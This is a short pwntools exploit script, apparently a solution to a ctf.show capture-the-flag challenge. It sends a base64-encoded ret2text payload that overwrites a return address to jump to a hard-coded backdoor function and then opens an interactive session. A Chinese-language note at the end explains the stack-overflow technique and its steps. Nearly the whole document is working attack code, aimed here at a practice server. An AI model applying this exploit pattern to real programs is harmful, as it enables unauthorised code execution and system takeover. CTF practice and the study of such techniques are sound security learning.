from pwn import *
import base64

p = remote('pwn.challenge.ctf.show', 28152)

input_addr = 0x811EB40
sys_addr = 0x8049284

payload = b'aaaa' + p32(sys_addr) + p32(input_addr)

# print(type(payload))
payload = base64.b64encode(payload)

p.sendlineafter(': ', payload)

p.interactive()

"""
【知识点讲解】
1. 题目类型：ret2text - 返回程序已有代码
2. 核心原理：
   - 利用栈溢出覆盖返回地址
   - 跳转到程序中已有的后门函数（如system、flag等）
   - 不需要注入shellcode，利用现有代码
3. 利用条件：
   - 程序存在栈溢出漏洞
   - 程序中有可利用的后门函数
   - 知道目标函数的地址
4. 关键步骤：
   - 计算偏移量（offset）
   - 构造payload：填充数据 + 目标地址
   - 发送payload触发漏洞
5. 注意：32位使用p32()，64位使用p64()
"""
